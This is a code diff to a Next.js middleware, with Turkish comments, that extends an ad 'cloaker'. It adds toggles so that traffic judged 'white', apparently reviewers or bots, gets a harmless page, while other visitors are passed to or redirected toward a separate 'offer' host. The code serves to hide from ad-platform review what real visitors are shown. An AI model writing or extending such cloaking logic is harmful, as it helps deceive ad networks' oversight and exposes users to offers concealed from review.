@@ -4,17 +4,21 @@ import { isAdminHost, isCrmPath } from "@/lib/admin-host";
 import { getCrmSecretPath, isCrmSecretPath } from "@/lib/crm-path";
 import {
   checkCloak,
+  isCloakEnabled,
   isCloakTestIp,
+  isRedirectEnabled,
   OFFER_COOKIE,
   offerPassCookieOptions,
   whiteRedirectTarget,
 } from "@/lib/cloaker";
 import {
   buildOfferHostUrl,
+  getOfferHost,
   hasAdClickInUrl,
   isAdPoolHost,
   isOfferHost,
   isTrustedOfferArrival,
+  normalizeHostname,
 } from "@/lib/offer-host";
 import { createOfferPassToken, OFFER_PASS_PARAM } from "@/lib/offer-pass";
 
@@ -195,9 +199,26 @@ export async function middleware(request: NextRequest) {
     return NextResponse.rewrite(new URL("/subeler.html", request.url));
   }
 
+  const cloakEnabled = await isCloakEnabled();
+  if (!cloakEnabled) {
+    return nextWithCloak(request, "offer", true);
+  }
+
   const cloak = await checkCloak(request);
   if (cloak?.page === "white") {
     return NextResponse.rewrite(new URL(whiteRedirectTarget(request, cloak.redirectUrl)));
+  }
+
+  // Cloaker offer kararı verdi → redirect kontrolü
+  const redirectEnabled = await isRedirectEnabled();
+  const offerHost = await getOfferHost();
+  const entryHost = normalizeHostname(host);
+
+  // Entry host ile offer host aynıysa redirect'i otomatik devre dışı bırak
+  const shouldRedirect = redirectEnabled && entryHost !== offerHost;
+
+  if (!shouldRedirect) {
+    return nextWithCloak(request, "offer", true);
   }
 
   const offerUrl = await buildOfferHostUrl(request);
